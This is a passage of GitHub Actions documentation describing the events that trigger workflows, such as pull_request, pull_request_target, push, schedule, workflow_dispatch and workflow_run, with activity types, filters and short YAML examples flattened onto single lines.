file exists on the default branch.\nRuns your workflow when an issue in the workflow's repository is created or modified. For activity related to comments in an issue, use the issue_comment event. For more information about issues, see About issues. For information about the issue APIs, see Objects in the GraphQL API documentation or REST API endpoints for issues.\nFor example, you can run a workflow when an issue has been opened, edited, or milestoned.\non: issues: types: [opened, edited, milestoned] \nlabel\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\nlabel\t- created\n- edited\n- deleted\n\tLast commit on default branch\tDefault branch\t\nNote\nMore than one activity type triggers this event. For information about each activity type, see Webhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the types keyword. For more information, see Workflow syntax for GitHub Actions.\nNote\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\nRuns your workflow when a label in your workflow's repository is created or modified. For more information about labels, see Managing labels. For information about the label APIs, see Objects in the GraphQL API documentation or REST API endpoints for labels.\nIf you want to run your workflow when a label is added to or removed from an issue, pull request, or discussion, use the labeled or unlabeled activity types for the issues, pull_request, pull_request_target, or discussion events instead.\nFor example, you can run a workflow when a label has been created or deleted.\non: label: types: [created, deleted] \nmerge_group\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\nmerge_group\tchecks_requested\tSHA of the merge group\tRef of the merge group\t\nNote\nMore than one activity type triggers this event. Although only the checks_requested activity type is supported, specifying the activity type will keep your workflow specific if more activity types are added in the future. For information about each activity type, see Webhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the types keyword. For more information, see Workflow syntax for GitHub Actions.\nIf your repository uses GitHub Actions to perform required checks on pull requests in your repository, you need to update the workflows to include the merge_group event as an additional trigger. Otherwise, status checks will not be triggered when you add a pull request to a merge queue. The merge will fail as the required status check will not be reported. The merge_group event is separate from the pull_request and push events.\nRuns your workflow when a pull request is added to a merge queue, which adds the pull request to a merge group. For more information see Merging a pull request with a merge queue.\nFor example, you can run a workflow when the checks_requested activity has occurred.\non: pull_request: branches: [ \"main\" ] merge_group: types: [checks_requested] \nmilestone\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\nmilestone\t- created\n- closed\n- opened\n- edited\n- deleted\n\tLast commit on default branch\tDefault branch\t\nNote\nMore than one activity type triggers this event. For information about each activity type, see Webhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the types keyword. For more information, see Workflow syntax for GitHub Actions.\nNote\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\nRuns your workflow when a milestone in the workflow's repository is created or modified. For more information about milestones, see About milestones. For information about the milestone APIs, see Objects in the GraphQL API documentation or REST API endpoints for milestones.\nIf you want to run your workflow when an issue is added to or removed from a milestone, use the milestoned or demilestoned activity types for the issues event instead.\nFor example, you can run a workflow when a milestone has been opened or deleted.\non: milestone: types: [opened, deleted] \npage_build\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\npage_build\tNot applicable\tLast commit on default branch\tNot applicable\t\nNote\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\nRuns your workflow when someone pushes to a branch that is the publishing source for GitHub Pages, if GitHub Pages is enabled for the repository. For more information about GitHub Pages publishing sources, see Configuring a publishing source for your GitHub Pages site. For information about the REST API, see REST API endpoints for repositories.\nFor example, you can run a workflow when the page_build event occurs.\non: page_build \npublic\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\npublic\tNot applicable\tLast commit on default branch\tDefault branch\t\nNote\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\nRuns your workflow when your workflow's repository changes from private to public. For information about the REST API, see REST API endpoints for repositories.\nFor example, you can run a workflow when the public event occurs.\non: public \npull_request\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\npull_request\t- assigned\n- unassigned\n- labeled\n- unlabeled\n- opened\n- edited\n- closed\n- reopened\n- synchronize\n- converted_to_draft\n- locked\n- unlocked\n- enqueued\n- dequeued\n- milestoned\n- demilestoned\n- ready_for_review\n- review_requested\n- review_request_removed\n- auto_merge_enabled\n- auto_merge_disabled\tLast merge commit on the GITHUB_REF branch\tPR merge branch refs/pull/PULL_REQUEST_NUMBER/merge\t\nNote\nMore than one activity type triggers this event. For information about each activity type, see Webhook events and payloads. By default, a workflow only runs when a pull_request event's activity type is opened, synchronize, or reopened. To trigger workflows by different activity types, use the types keyword. For more information, see Workflow syntax for GitHub Actions.\nWorkflows will not run on pull_request activity if the pull request has a merge conflict. The merge conflict must be resolved first. Conversely, workflows with the pull_request_target event will run even if the pull request has a merge conflict. Before using the pull_request_target trigger, you should be aware of the security risks. For more information, see pull_request_target.\nThe pull_request webhook event payload is empty for merged pull requests and pull requests that come from forked repositories.\nThe value of GITHUB_REF varies for a closed pull request depending on whether the pull request has been merged or not. If a pull request was closed but not merged, it will be refs/pull/PULL_REQUEST_NUMBER/merge. If a pull request was closed as a result of being merged, it will be the fully qualified ref of the branch it was merged into, for example /refs/heads/main.\nRuns your workflow when activity on a pull request in the workflow's repository occurs. For example, if no activity types are specified, the workflow runs when a pull request is opened or reopened or when the head branch of the pull request is updated. For activity related to pull request reviews, pull request review comments, or pull request comments, use the pull_request_review, pull_request_review_comment, or issue_comment events instead. For information about the pull request APIs, see Objects in the GraphQL API documentation or REST API endpoints for pull requests.\nNote that GITHUB_SHA for this event is the last merge commit of the pull request merge branch. If you want to get the commit ID for the last commit to the head branch of the pull request, use github.event.pull_request.head.sha instead.\nFor example, you can run a workflow when a pull request has been opened or reopened.\non: pull_request: types: [opened, reopened] \nYou can use the event context to further control when jobs in your workflow will run. For example, this workflow will run when a review is requested on a pull request, but the specific_review_requested job will only run when a review by octo-team is requested.\non: pull_request: types: [review_requested] jobs: specific_review_requested: runs-on: ubuntu-latest if: ${{ github.event.requested_team.name == 'octo-team'}} steps: - run: echo 'A review from octo-team was requested' \nRunning your pull_request workflow based on the head or base branch of a pull request\nYou can use the branches or branches-ignore filter to configure your workflow to only run on pull requests that target specific branches. For more information, see Workflow syntax for GitHub Actions.\nFor example, this workflow will run when someone opens a pull request that targets a branch whose name starts with releases/:\non: pull_request: types: - opened branches: - 'releases/**' \nNote\nIf you use both the branches filter and the paths filter, the workflow will only run when both filters are satisfied. For example, the following workflow will only run when a pull request that includes a change to a JavaScript (.js) file is opened on a branch whose name starts with releases/:\non: pull_request: types: - opened branches: - 'releases/**' paths: - '**.js' \nTo run a job based on the pull request's head branch name (as opposed to the pull request's base branch name), use the github.head_ref context in a conditional. For example, this workflow will run whenever a pull request is opened, but the run_if job will only execute if the head of the pull request is a branch whose name starts with releases/:\non: pull_request: types: - opened jobs: run_if: if: startsWith(github.head_ref, 'releases/') runs-on: ubuntu-latest steps: - run: echo \"The head of this PR starts with 'releases/'\" \nRunning your pull_request workflow based on files changed in a pull request\nYou can also configure your workflow to run when a pull request changes specific files. For more information, see Workflow syntax for GitHub Actions.\nFor example, this workflow will run when a pull request includes a change to a JavaScript file (.js):\non: pull_request: paths: - '**.js' \nNote\nIf you use both the branches filter and the paths filter, the workflow will only run when both filters are satisfied. For example, the following workflow will only run when a pull request that includes a change to a JavaScript (.js) file is opened on a branch whose name starts with releases/:\non: pull_request: types: - opened branches: - 'releases/**' paths: - '**.js' \nRunning your pull_request workflow when a pull request merges\nWhen a pull request merges, the pull request is automatically closed. To run a workflow when a pull request merges, use the pull_request closed event type along with a conditional that checks the merged value of the event. For example, the following workflow will run whenever a pull request closes. The if_merged job will only run if the pull request was also merged.\non: pull_request: types: - closed jobs: if_merged: if: github.event.pull_request.merged == true runs-on: ubuntu-latest steps: - run: | echo The PR was merged \nWorkflows in forked repositories\nWorkflows don't run in forked repositories by default. You must enable GitHub Actions in the Actions tab of the forked repository.\nWith the exception of GITHUB_TOKEN, secrets are not passed to the runner when a workflow is triggered from a forked repository. The GITHUB_TOKEN has read-only permissions in pull requests from forked repositories. For more information, see Automatic token authentication.\nPull request events for forked repositories\nFor pull requests from a forked repository to the base repository, GitHub sends the pull_request, issue_comment, pull_request_review_comment, pull_request_review, and pull_request_target events to the base repository. No pull request events occur on the forked repository.\nWhen a first-time contributor submits a pull request to a public repository, a maintainer with write access may need to approve running workflows on the pull request. For more information, see Approving workflow runs from public forks.\nFor pull requests from a forked repository to a private repository, workflows only run when they are enabled, see Managing GitHub Actions settings for a repository.\nNote\nWorkflows triggered by Dependabot pull requests are treated as though they are from a forked repository, and are also subject to these restrictions.\nTo run your workflow when a comment on a pull request (not on a pull request's diff) is created, edited, or deleted, use the issue_comment event. For activity related to pull request reviews or pull request review comments, use the pull_request_review or pull_request_review_comment events.\npull_request_review\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\npull_request_review\t- submitted\n- edited\n- dismissed\tLast merge commit on the GITHUB_REF branch\tPR merge branch refs/pull/PULL_REQUEST_NUMBER/merge\t\nNote\nMore than one activity type triggers this event. For information about each activity type, see Webhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the types keyword. For more information, see Workflow syntax for GitHub Actions.\nRuns your workflow when a pull request review is submitted, edited, or dismissed. A pull request review is a group of pull request review comments in addition to a body comment and a state. For activity related to pull request review comments or pull request comments, use the pull_request_review_comment or issue_comment events instead. For information about the pull request review APIs, see Objects in the GraphQL API documentation or REST API endpoints for pull requests.\nFor example, you can run a workflow when a pull request review has been edited or dismissed.\non: pull_request_review: types: [edited, dismissed] \nRunning a workflow when a pull request is approved\nTo run your workflow when a pull request has been approved, you can trigger your workflow with the submitted type of pull_request_review event, then check the review state with the github.event.review.state property. For example, this workflow will run whenever a pull request review is submitted, but the approved job will only run if the submitted review is an approving review:\non: pull_request_review: types: [submitted] jobs: approved: if: github.event.review.state == 'approved' runs-on: ubuntu-latest steps: - run: echo \"This PR was approved\" \nWorkflows in forked repositories\nWorkflows don't run in forked repositories by default. You must enable GitHub Actions in the Actions tab of the forked repository.\nWith the exception of GITHUB_TOKEN, secrets are not passed to the runner when a workflow is triggered from a forked repository. The GITHUB_TOKEN has read-only permissions in pull requests from forked repositories. For more information, see Automatic token authentication.\nPull request events for forked repositories\nFor pull requests from a forked repository to the base repository, GitHub sends the pull_request, issue_comment, pull_request_review_comment, pull_request_review, and pull_request_target events to the base repository. No pull request events occur on the forked repository.\nWhen a first-time contributor submits a pull request to a public repository, a maintainer with write access may need to approve running workflows on the pull request. For more information, see Approving workflow runs from public forks.\nFor pull requests from a forked repository to a private repository, workflows only run when they are enabled, see Managing GitHub Actions settings for a repository.\nNote\nWorkflows triggered by Dependabot pull requests are treated as though they are from a forked repository, and are also subject to these restrictions.\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\npull_request_review_comment\t- created\n- edited\n- deleted\tLast merge commit on the GITHUB_REF branch\tPR merge branch refs/pull/PULL_REQUEST_NUMBER/merge\t\nNote\nMore than one activity type triggers this event. For information about each activity type, see Webhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the types keyword. For more information, see Workflow syntax for GitHub Actions.\nRuns your workflow when a pull request review comment is modified. A pull request review comment is a comment on a pull request's diff. For activity related to pull request reviews or pull request comments, use the pull_request_review or issue_comment events instead. For information about the pull request review comment APIs, see Objects in the GraphQL API documentation or REST API endpoints for pull requests.\nFor example, you can run a workflow when a pull request review comment has been created or deleted.\non: pull_request_review_comment: types: [created, deleted] \nWorkflows in forked repositories\nWorkflows don't run in forked repositories by default. You must enable GitHub Actions in the Actions tab of the forked repository.\nWith the exception of GITHUB_TOKEN, secrets are not passed to the runner when a workflow is triggered from a forked repository. The GITHUB_TOKEN has read-only permissions in pull requests from forked repositories. For more information, see Automatic token authentication.\nPull request events for forked repositories\nFor pull requests from a forked repository to the base repository, GitHub sends the pull_request, issue_comment, pull_request_review_comment, pull_request_review, and pull_request_target events to the base repository. No pull request events occur on the forked repository.\nWhen a first-time contributor submits a pull request to a public repository, a maintainer with write access may need to approve running workflows on the pull request. For more information, see Approving workflow runs from public forks.\nFor pull requests from a forked repository to a private repository, workflows only run when they are enabled, see Managing GitHub Actions settings for a repository.\nNote\nWorkflows triggered by Dependabot pull requests are treated as though they are from a forked repository, and are also subject to these restrictions.\npull_request_target\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\npull_request\t- assigned\n- unassigned\n- labeled\n- unlabeled\n- opened\n- edited\n- closed\n- reopened\n- synchronize\n- converted_to_draft\n- ready_for_review\n- locked\n- unlocked \n- review_requested \n- review_request_removed \n- auto_merge_enabled \n- auto_merge_disabled\tLast commit on the PR base branch\tPR base branch\t\nNote\nMore than one activity type triggers this event. For information about each activity type, see Webhook events and payloads. By default, a workflow only runs when a pull_request_target event's activity type is opened, synchronize, or reopened. To trigger workflows by different activity types, use the types keyword. For more information, see Workflow syntax for GitHub Actions.\nRuns your workflow when activity on a pull request in the workflow's repository occurs. For example, if no activity types are specified, the workflow runs when a pull request is opened or reopened or when the head branch of the pull request is updated.\nThis event runs in the context of the base of the pull request, rather than in the context of the merge commit, as the pull_request event does. This prevents execution of unsafe code from the head of the pull request that could alter your repository or steal any secrets you use in your workflow. This event allows your workflow to do things like label or comment on pull requests from forks. Avoid using this event if you need to build or run code from the pull request.\nTo ensure repository security, branches with names that match certain patterns (such as those which look similar to SHAs) may not trigger workflows with the pull_request_target event.\nWarning\nFor workflows that are triggered by the pull_request_target event, the GITHUB_TOKEN is granted read/write repository permission unless the permissions key is specified and the workflow can access secrets, even when it is triggered from a fork. Although the workflow runs in the context of the base of the pull request, you should make sure that you do not check out, build, or run untrusted code from the pull request with this event. Additionally, any caches share the same scope as the base branch. To help prevent cache poisoning, you should not save the cache if there is a possibility that the cache contents were altered. For more information, see Keeping your GitHub Actions and workflows secure: Preventing pwn requests on the GitHub Security Lab website.\nFor example, you can run a workflow when a pull request has been assigned, opened, synchronize, or reopened.\non: pull_request_target: types: [assigned, opened, synchronize, reopened] \nRunning your pull_request_target workflow based on the head or base branch of a pull request\nYou can use the branches or branches-ignore filter to configure your workflow to only run on pull requests that target specific branches. For more information, see Workflow syntax for GitHub Actions.\nFor example, this workflow will run when someone opens a pull request that targets a branch whose name starts with releases/:\non: pull_request_target: types: - opened branches: - 'releases/**' \nNote\nIf you use both the branches filter and the paths filter, the workflow will only run when both filters are satisfied. For example, the following workflow will only run when a pull request that includes a change to a JavaScript (.js) file is opened on a branch whose name starts with releases/:\non: pull_request_target: types: - opened branches: - 'releases/**' paths: - '**.js' \nTo run a job based on the pull request's head branch name (as opposed to the pull request's base branch name), use the github.head_ref context in a conditional. For example, this workflow will run whenever a pull request is opened, but the run_if job will only execute if the head of the pull request is a branch whose name starts with releases/:\non: pull_request_target: types: - opened jobs: run_if: if: startsWith(github.head_ref, 'releases/') runs-on: ubuntu-latest steps: - run: echo \"The head of this PR starts with 'releases/'\" \nRunning your pull_request_target workflow based on files changed in a pull request\nYou can use the paths or paths-ignore filter to configure your workflow to run when a pull request changes specific files. For more information, see Workflow syntax for GitHub Actions.\nFor example, this workflow will run when a pull request includes a change to a JavaScript file (.js):\non: pull_request_target: paths: - '**.js' \nNote\nIf you use both the branches filter and the paths filter, the workflow will only run when both filters are satisfied. For example, the following workflow will only run when a pull request that includes a change to a JavaScript (.js) file is opened on a branch whose name starts with releases/:\non: pull_request_target: types: - opened branches: - 'releases/**' paths: - '**.js' \nRunning your pull_request_target workflow when a pull request merges\nWhen a pull request merges, the pull request is automatically closed. To run a workflow when a pull request merges, use the pull_request_target closed event type along with a conditional that checks the merged value of the event. For example, the following workflow will run whenever a pull request closes. The if_merged job will only run if the pull request was also merged.\non: pull_request_target: types: - closed jobs: if_merged: if: github.event.pull_request.merged == true runs-on: ubuntu-latest steps: - run: | echo The PR was merged \npush\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\npush\tNot applicable\tTip commit pushed to the ref. When you delete a branch, the SHA in the workflow run (and its associated refs) reverts to the default branch of the repository.\tUpdated ref\t\nNote\nThe webhook payload available to GitHub Actions does not include the added, removed, and modified attributes in the commit object. You can retrieve the full commit object using the API. For information, see Objects in the GraphQL API documentation or REST API endpoints for commits.\nNote\nEvents will not be created if more than 5,000 branches are pushed at once. Events will not be created for tags when more than three tags are pushed at once.\nRuns your workflow when you push a commit or tag, or when you create a repository from a template.\nFor example, you can run a workflow when the push event occurs.\non: push \nNote\nWhen a push webhook event triggers a workflow run, the Actions UI's \"pushed by\" field shows the account of the pusher and not the author or committer. However, if the changes are pushed to a repository using SSH authentication with a deploy key, then the \"pushed by\" field will be the repository admin who verified the deploy key when it was added it to a repository.\nRunning your workflow only when a push to specific branches occurs\nYou can use the branches or branches-ignore filter to configure your workflow to only run when specific branches are pushed. For more information, see Workflow syntax for GitHub Actions.\nFor example, this workflow will run when someone pushes to main or to a branch that starts with releases/.\non: push: branches: - 'main' - 'releases/**' \nNote\nIf you use both the branches filter and the paths filter, the workflow will only run when both filters are satisfied. For example, the following workflow will only run when a push that includes a change to a JavaScript (.js) file is made to a branch whose name starts with releases/:\non: push: branches: - 'releases/**' paths: - '**.js' \nRunning your workflow only when a push of specific tags occurs\nYou can use the tags or tags-ignore filter to configure your workflow to only run when specific tags are pushed. For more information, see Workflow syntax for GitHub Actions.\nFor example, this workflow will run when someone pushes a tag that starts with v1..\non: push: tags: - v1.** \nRunning your workflow only when a push affects specific files\nYou can use the paths or paths-ignore filter to configure your workflow to run when a push to specific files occurs. For more information, see Workflow syntax for GitHub Actions.\nFor example, this workflow will run when someone pushes a change to a JavaScript file (.js):\non: push: paths: - '**.js' \nNote\nIf you use both the branches filter and the paths filter, the workflow will only run when both filters are satisfied. For example, the following workflow will only run when a push that includes a change to a JavaScript (.js) file is made to a branch whose name starts with releases/:\non: push: branches: - 'releases/**' paths: - '**.js' \nregistry_package\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\nregistry_package\t- published\n- updated\tCommit of the published package\tBranch or tag of the published package\t\nNote\nMore than one activity type triggers this event. For information about each activity type, see Webhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the types keyword. For more information, see Workflow syntax for GitHub Actions.\nNote\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\nNote\nWhen pushing multi-architecture container images, this event occurs once per manifest, so you might observe your workflow triggering multiple times. To mitigate this, and only run your workflow job for the event that contains the actual image tag information, use a conditional:\njobs: job_name: if: $true \nRuns your workflow when activity related to GitHub Packages occurs in your repository. For more information, see GitHub Packages Documentation.\nFor example, you can run a workflow when a new package version has been published.\non: registry_package: types: [published] \nrelease\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\nrelease\t- published \n- unpublished \n- created \n- edited \n- deleted \n- prereleased\n- released\tLast commit in the tagged release\tTag ref of release refs/tags/<tag_name>\t\nNote\nMore than one activity type triggers this event. For information about each activity type, see Webhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the types keyword. For more information, see Workflow syntax for GitHub Actions.\nNote\nWorkflows are not triggered for the created, edited, or deleted activity types for draft releases. When you create your release through the GitHub UI, your release may automatically be saved as a draft.\nNote\nThe prereleased type will not trigger for pre-releases published from draft releases, but the published type will trigger. If you want a workflow to run when stable and pre-releases publish, subscribe to published instead of released and prereleased.\nRuns your workflow when release activity in your repository occurs. For information about the release APIs, see Objects in the GraphQL API documentation or REST API endpoints for releases and release assets in the REST API documentation.\nFor example, you can run a workflow when a release has been published.\non: release: types: [published] \nrepository_dispatch\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\nrepository_dispatch\tCustom\tLast commit on default branch\tDefault branch\t\nNote\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\nYou can use the GitHub API to trigger a webhook event called repository_dispatch when you want to trigger a workflow for activity that happens outside of GitHub. For more information, see REST API endpoints for repositories.\nWhen you make a request to create a repository_dispatch event, you must specify an event_type to describe the activity type. By default, all repository_dispatch activity types trigger a workflow to run. You can use the types keyword to limit your workflow to run when a specific event_type value is sent in the repository_dispatch webhook payload.\non: repository_dispatch: types: [test_result] \nNote\nThe event_type value is limited to 100 characters.\nAny data that you send through the client_payload parameter will be available in the github.event context in your workflow. For example, if you send this request body when you create a repository dispatch event:\n{ \"event_type\": \"test_result\", \"client_payload\": { \"passed\": false, \"message\": \"Error: timeout\" } } \nthen you can access the payload in a workflow like this:\non: repository_dispatch: types: [test_result] jobs: run_if_failure: if: ${{ !github.event.client_payload.passed }} runs-on: ubuntu-latest steps: - env: MESSAGE: ${{ github.event.client_payload.message }} run: echo $MESSAGE \nNote\nThe maximum number of top-level properties in client_payload is 10.\nThe payload can contain a maximum of 65,535 characters.\nschedule\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\nNot applicable\tNot applicable\tLast commit on default branch\tDefault branch\t\nNote\nThe schedule event can be delayed during periods of high loads of GitHub Actions workflow runs. High load times include the start of every hour. If the load is sufficiently high enough, some queued jobs may be dropped. To decrease the chance of delay, schedule your workflow to run at a different time of the hour.\nThis event will only trigger a workflow run if the workflow file is on the default branch.\nScheduled workflows will only run on the default branch.\nIn a public repository, scheduled workflows are automatically disabled when no repository activity has occurred in 60 days. For information on re-enabling a disabled workflow, see Disabling and enabling a workflow.\nFor an enterprise with Enterprise Managed Users, scheduled workflows will not run if the last actor associated with the scheduled workflow has been deprovisioned (and therefore become suspended) by the Enterprise Managed User identity provider (IdP). However, if the last actor Enterprise Managed User has not been deprovisioned by the IdP, and has only been removed as a member from a given organization in the enterprise, scheduled workflows will still run with that user set as the actor. Similarly, for an enterprise without Enterprise Managed Users, removing a user from an organization will not prevent scheduled workflows which had that user as their actor from running. Essentially, triggering a scheduled workflow requires that the status of the actor user account associated with the workflow is currently active (i.e. not suspended or deleted). Thus, the user account's status, in both Enterprise Managed User and non-Enterprise Managed User scenarios, is what's important, not the user's membership status in the organization where the scheduled workflow is located.\nCertain repository events change the actor associated with the workflow. For example, a user who changes the default branch of the repository, which changes the branch on which scheduled workflows run, becomes actor for those scheduled workflows.\nFor a deactivated scheduled workflow, if a user with write permissions to the repository makes a commit that changes the cron schedule on the workflow, the workflow will be reactivated, and that user will become the actor associated with any workflow runs. Note that, in this situation, the workflow is not reactivated by any change to the workflow file; you must alter the cron value in the workflow and commit this change.\nExample:\non: schedule: - cron: \"15 4,5 * * *\" # <=== Change this value \nThe schedule event allows you to trigger a workflow at a scheduled time.\nYou can schedule a workflow to run at specific UTC times using POSIX cron syntax. Scheduled workflows run on the latest commit on the default or base branch. The shortest interval you can run scheduled workflows is once every 5 minutes.\nThis example triggers the workflow every day at 5:30 and 17:30 UTC:\non: schedule: # * is a special character in YAML so you have to quote this string - cron: '30 5,17 * * *' \nA single workflow can be triggered by multiple schedule events. You can access the schedule event that triggered the workflow through the github.event.schedule context. This example triggers the workflow to run at 5:30 UTC every Monday-Thursday, but skips the Not on Monday or Wednesday step on Monday and Wednesday.\non: schedule: - cron: '30 5 * * 1,3' - cron: '30 5 * * 2,4' jobs: test_schedule: runs-on: ubuntu-latest steps: - name: Not on Monday or Wednesday if: github.event.schedule != '30 5 * * 1,3' run: echo \"This step will be skipped on Monday and Wednesday\" - name: Every time run: echo \"This step will always run\" \nCron syntax has five fields separated by a space, and each field represents a unit of time.\n┌───────────── minute (0 - 59) │ ┌───────────── hour (0 - 23) │ │ ┌───────────── day of the month (1 - 31) │ │ │ ┌───────────── month (1 - 12 or JAN-DEC) │ │ │ │ ┌───────────── day of the week (0 - 6 or SUN-SAT) │ │ │ │ │ │ │ │ │ │ │ │ │ │ │ * * * * * \nYou can use these operators in any of the five fields:\nOperatorDescriptionExample\n*\tAny value\t15 * * * * runs at every minute 15 of every hour of every day.\t\n,\tValue list separator\t2,10 4,5 * * * runs at minute 2 and 10 of the 4th and 5th hour of every day.\t\n-\tRange of values\t30 4-6 * * * runs at minute 30 of the 4th, 5th, and 6th hour.\t\n/\tStep values\t20/15 * * * * runs every 15 minutes starting from minute 20 through 59 (minutes 20, 35, and 50).\t\nNote\nGitHub Actions does not support the non-standard syntax @yearly, @monthly, @weekly, @daily, @hourly, and @reboot.\nYou can use crontab guru to help generate your cron syntax and confirm what time it will run. To help you get started, there is also a list of crontab guru examples.\nNotifications for scheduled workflows are sent to the user who last modified the cron syntax in the workflow file. For more information, see Notifications for workflow runs.\nstatus\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\nstatus\tNot applicable\tLast commit on default branch\tNot applicable\t\nNote\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\nRuns your workflow when the status of a Git commit changes. For example, commits can be marked as error, failure, pending, or success. If you want to provide more details about the status change, you may want to use the check_run event. For information about the commit status APIs, see Objects in the GraphQL API documentation or REST API endpoints for commits.\nFor example, you can run a workflow when the status event occurs.\non: status \nIf you want to run a job in your workflow based on the new commit state, you can use the github.event.state context. For example, the following workflow triggers when a commit status changes, but the if_error_or_failure job only runs if the new commit state is error or failure.\non: status jobs: if_error_or_failure: runs-on: ubuntu-latest if: >- github.event.state == 'error' || github.event.state == 'failure' steps: - env: DESCRIPTION: ${{ github.event.description }} run: | echo The status is error or failed: $DESCRIPTION \nwatch\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\nwatch\t- started\tLast commit on default branch\tDefault branch\t\nNote\nMore than one activity type triggers this event. Although only the started activity type is supported, specifying the activity type will keep your workflow specific if more activity types are added in the future. For information about each activity type, see Webhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the types keyword. For more information, see Workflow syntax for GitHub Actions.\nNote\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\nRuns your workflow when the workflow's repository is starred. For information about the pull request APIs, see Mutations in the GraphQL API documentation or REST API endpoints for starring.\nFor example, you can run a workflow when someone stars a repository, which is the started activity type for a watch event.\non: watch: types: [started] \nworkflow_call\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\nSame as the caller workflow\tNot applicable\tSame as the caller workflow\tSame as the caller workflow\t\nworkflow_call is used to indicate that a workflow can be called by another workflow. When a workflow is triggered with the workflow_call event, the event payload in the called workflow is the same event payload from the calling workflow. For more information see, Reusing workflows.\nThe example below only runs the workflow when it's called from another workflow:\non: workflow_call \nworkflow_dispatch\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\nworkflow_dispatch\tNot applicable\tLast commit on the GITHUB_REF branch or tag\tBranch or tag that received dispatch\t\nNote\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\nTo enable a workflow to be triggered manually, you need to configure the workflow_dispatch event. You can manually trigger a workflow run using the GitHub API, GitHub CLI, or the GitHub UI. For more information, see Manually running a workflow.\non: workflow_dispatch \nProviding inputs\nYou can configure custom-defined input properties, default input values, and required inputs for the event directly in your workflow. When you trigger the event, you can provide the ref and any inputs. When the workflow runs, you can access the input values in the inputs context. For more information, see Accessing contextual information about workflow runs.\nNote\nThe workflow will also receive the inputs in the github.event.inputs context. The information in the inputs context and github.event.inputs context is identical except that the inputs context preserves Boolean values as Booleans instead of converting them to strings. The choice type resolves to a string and is a single selectable option.\nThe maximum number of top-level properties for inputs is 10.\nThe maximum payload for inputs is 65,535 characters.\nThis example defines inputs called logLevel, tags, and environment. You pass values for these inputs to the workflow when you run it. This workflow then prints the values to the log, using the inputs.logLevel, inputs.tags, and inputs.environment context properties.\non: workflow_dispatch: inputs: logLevel: description: 'Log level' required: true default: 'warning' type: choice options: - info - warning - debug tags: description: 'Test scenario tags' required: false type: boolean environment: description: 'Environment to run tests against' type: environment required: true jobs: log-the-inputs: runs-on: ubuntu-latest steps: - run: | echo \"Log level: $LEVEL\" echo \"Tags: $TAGS\" echo \"Environment: $ENVIRONMENT\" env: LEVEL: ${{ inputs.logLevel }} TAGS: ${{ inputs.tags }} ENVIRONMENT: ${{ inputs.environment }} \nIf you run this workflow from a browser you must enter values for the required inputs manually before the workflow will run.\nYou can also pass inputs when you run a workflow from a script, or by using GitHub CLI. For example:\ngh workflow run run-tests.yml -f logLevel=warning -f tags=false -f environment=staging \nFor more information, see the GitHub CLI information in Manually running a workflow.\nworkflow_run\nWebhook event payloadActivity typesGITHUB_SHAGITHUB_REF\nworkflow_run\t- completed\n- requested\n- in_progress\tLast commit on default branch\tDefault branch\t\nNote\nMore than one activity type triggers this event. The requested activity type does not occur when a workflow is re-run. For information about each activity type, see Webhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the types keyword. For more information, see Workflow syntax for GitHub Actions.\nNote\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\nNote\nYou can't use workflow_run to chain together more than three levels of workflows. For example, if you attempt to trigger five workflows (named B to F) to run sequentially after an initial workflow A has run (that is: A → B → C → D → E → F), workflows E and F will not be run.\nThis event occurs when a workflow run is requested or completed. It allows you to execute a workflow based on execution or completion of another workflow. The workflow started by the workflow_run event is able to access secrets and write tokens, even if the previous workflow was not. This is useful in cases where the previous workflow is intentionally not privileged, but you need to take a privileged action in a later workflow.\nIn this example, a workflow is configured to run after the separate \"Run Tests\" workflow completes.\non: workflow_run: workflows: [Run Tests] types: - completed \nIf you specify multiple workflows for the workflow_run event, only one of the workflows needs to run. For example, a workflow with the following trigger will run whenever the \"Staging\" workflow or the \"Lab\" workflow completes.\non: workflow_run: workflows: [Staging, Lab] types: - completed \nRunning a workflow based on the conclusion of another workflow\nA workflow run is triggered regardless of the conclusion of the previous workflow. If you want to run a job or step based on the result of the triggering workflow, you can use a conditional with the github.event.workflow_run.conclusion property. For example, this workflow will run whenever a workflow named \"Build\" completes, but the on-success job will only run if the \"Build\" workflow succeeded, and the on-failure job will only run if the \"Build\" workflow failed:\non: workflow_run: workflows: [Build] types: [completed] jobs: on-success: runs-on: ubuntu-latest if: ${{ github.event.workflow_run.conclusion == 'success' }} steps: - run: echo 'The triggering workflow passed' on-failure: runs-on: ubuntu-latest if: ${{ github.event.workflow_run.conclusion == 'failure' }} 